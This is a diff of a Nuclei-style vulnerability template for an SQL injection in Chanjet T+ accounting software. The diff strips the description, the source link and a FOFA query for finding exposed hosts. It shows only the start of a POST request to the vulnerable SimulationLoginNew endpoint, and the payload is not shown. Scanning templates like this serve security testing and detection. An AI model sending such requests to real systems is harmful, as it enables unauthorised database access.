@@ -3,12 +3,8 @@ info:
   name: 畅捷通T+ SimulationLoginNew 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fdktid8ydih6vi6p'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: fdktid8ydih6vi6p
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - 'POST /tplus/GLSyncService.asmx/SimulationLoginNew HTTP/1.1
